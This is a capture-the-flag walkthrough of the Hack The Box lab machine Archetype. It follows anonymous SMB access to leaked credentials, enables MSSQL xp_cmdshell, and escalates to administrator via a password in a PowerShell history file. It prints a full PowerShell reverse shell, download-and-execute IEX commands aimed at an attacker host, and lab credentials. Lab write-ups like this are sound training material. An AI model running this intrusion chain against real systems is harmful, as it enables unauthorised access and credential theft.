# Archetype: 10.10.10.27

## Hints

- Find some creds where you would usually share files
- MSSQL is your friend for remote access with some creds
- Usual privesc scripts should help find more creds!
- Try `impacket` for some useful tools, but not essential

## nmap

Starting with the usual `nmap` scan. Interesting ports:

```none
135/tcp  open     msrpc        Microsoft Windows RPC
139/tcp  open     netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open     ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
```

## Samba: Recon

Started with Samba, as it is my strongest service on Windows boxes. Did the usual Samba anonymous connect and list:

```none
└─$ smbclient -N -L //10.10.10.27/

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

Noticed the `backups` share - so connected, found one file, and downloaded.

```none
└─$ smbclient -N //10.10.10.27/backups  
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Jan 21 01:20:57 2020
  ..                                  D        0  Tue Jan 21 01:20:57 2020
  prod.dtsConfig                     AR      609  Tue Jan 21 01:23:02 2020

                10328063 blocks of size 4096. 8219718 blocks available
smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```

Reviewing the file contents, provided some useful credentials.

```none
└─$ cat prod.dtsConfig                         
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

User information:

- Username: `ARCHETYPE\sql_svc`
- Password: `M3g4c0rp123`

## MSSQL

Since there seemed nothing else available - started prodding MSSQL. I had credentials, but no idea how to get any remote access using those credentials (still new to MS systems). After some Google-foo, found an interesting article on [Enabling XP_CMDSHELL in SQL Server](https://infinitelogins.com/2020/09/06/enabling-xp_cmdshell-in-sql-server/). The first paragraph sounded good:

> If you ever get access to SQL credentials, you may be able to use a tool to connect to it via command line and execute system commands via "XP_CMDSHELL". However, this feature is not always enabled by default.

I followed the advice given and used `sqsh` to connect to the MSSQL service using the discovered credentials.

```none
└─$ sqsh -S 10.10.10.27 -U ARCHTYPE\\sql_svc -P M3g4c0rp123
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1> 
```

And then tried to enable XP_CMDSHELL using the following commands - where each is run on a different line.

```none
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go

EXEC SP_CONFIGURE 'xp_cmdshell', 1
reconfigure
go
```

From here, it is possible to get command execution. Here is one example:

```none
xp_cmdshell 'whoami'
go
```

The output formatting is terrible in this tool. Where a simple `whoami` almost takes half a terminal screen. Regardless, command execution working. The next step was to get a reverse shell. 

## Reverse Shell using MSSQL XP_CMDSHELL

Since I am still expanding my MS pentesting skills, needed some serious trial and error getting a reverse shell. Powershell is still quite foreign to me. But luckily there are lots of good resources. Looking over the [PayloadsAllTheThings/Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell) section on Powershell - got me a nice reverse shell example.

I modified it a little - so that it could be executed from a file. I saved the following info in `shell.ps1`.

```none
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.15", 9001);$stream = $client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

The next step was to upload the reverse shell to the Windows server and execute it. To get prepared, I started a Python HTTP server (in the directory with `shell.ps1`):

```none
python3 -m http.server 8000
```

And also started a netcat listener:

```none
nc -lvnp 9001
```

The next step, upload my Powershell code in the MSSQL console.

```none
xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.15:8000/shell.ps1');"
go
```

## Flag: User

Success - a reverse shell!

```none
└─$ nc -lvnp 9001                                 
listening on [any] 9001 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.27] 49685
# whoami.exe
archetype\sql_svc
# Get-Host | Select-Object Version

Version    
-------    
5.1.17763.1


# (Get-Content C:\Users\sql_svc\Desktop\user.txt | Measure-Object -Character).Characters
32
```

## Privesc

Started with a quick WinPEAS scan using `winPEASany.exe`. 

```none
└─$ wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe
```

Uploaded it to the server:

```none
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15:8000/winPEASany.exe')"
```

Served it using the same Python HTTP server method. Ran it, and reviewed the results. Notice some interesting Powershell history file that winPEAS detected.

```none
???????????? PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 79B
```

Had a look at the file contents.

```none
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

Hurrah! More credentials:

- Username: `administrator`
- Password: `MEGACORP_4dm1n!!`

## Flag: Root (Admin shell using `winexe`)

After some Googling, I discovered the `winexe` tool. The docs describe the use of the tool:

> This tool is part of the samba(7) suite. The `winexe` allows remote command execution on native Windows operating systems.

I remember using it a long time ago - so it seemed like a good option. The syntax is relatively straightforward. I started with running `cmd.exe` to get a shell - which worked.

```none
└─$ winexe -U 'administrator%MEGACORP_4dm1n!!' //10.10.10.27 'powershell.exe'
```

Then upgraded to Powershell - which did work... but had some weird input bugs.

```none
└─$ winexe -U 'administrator%MEGACORP_4dm1n!!' //10.10.10.27 'powershell.exe'                                 134 ⨯
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami

archetype\administrator
PS C:\Windows\system32> (Get-Content C:\Users\administrator\Desktop\root.txt | Measure-Object -Character).Characters
Get-Content C:\Users\sql_svc\Desktop\user.txt | Measure-Object -Character).Characters
32
```

Done! However, after reading a couple of other walkthroughs - it seemed I selected some unusual tools in my methods. I thought it would be useful to document these other solutions...

## Alternative MSSQL Shell using `impacket`

After seeing others use `impacket` I wanted to try it. Started by downloading and compiling.

```none
sudo apt get install python3-pip
wget https://github.com/SecureAuthCorp/impacket/releases/download/impacket_0_9_22/impacket-0.9.22.tar.gz
tar xvf impacket-0.9.22.tar.gz
cd impacket-0.9.22
python3 -m pip install .
```

Use `mssqlclient.py` script to connect to the server.

```
cd examples
python3 mssqlclient.py -windows-auth ARCHTYPE/sql_svc@10.10.10.27
```

Then, enable `xp_cmdshell`.

```
EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1
reconfigure;
xp_cmdshell "whoami"
```

Get a proper shell using the same `shell.ps1` reverse shell.

```
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.15:8000/shell.ps1\")";
```

The main difference was the `mssqlclient.py` shell seemed to format output in a much more eye-pleasing manner. There was also a slight variation in the Powershell syntax needed to fetch the `shell.ps1` file. Apart from that - not much difference.

## Alternative Admin Shell using `impacket`

Also tried the `psexec.py` script to get remote shell access as administrator. This script was super easy and seemed to provide a very stable experience. Apart from that, not much difference.

```
└─$ python3 psexec.py administrator@10.10.10.27
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.27.....
[*] Found writable share ADMIN$
[*] Uploading file FDcpnrYy.exe
[*] Opening SVCManager on 10.10.10.27.....
[*] Creating service zcer on 10.10.10.27.....
[*] Starting service zcer.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

## Lessons Learned

- There are sometimes multiple tools for the same jobs - but some are more stable/easier to use
- Learn more Powershell!

## Useful Resources

- Check the official/non-official walkthroughs on Hack The Box website
